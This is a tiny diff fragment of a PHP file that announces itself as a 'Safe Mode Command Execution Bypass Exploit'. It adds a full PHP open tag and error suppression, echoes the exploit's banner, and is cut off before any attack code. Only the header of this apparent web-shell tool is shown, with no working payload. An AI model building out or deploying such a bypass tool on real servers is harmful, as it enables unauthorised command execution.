@@ -1,4 +1,6 @@
-<?
+<?php
+error_reporting(0);
+
 echo "<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit</font></b><br>";
 print_r('
 <pre>
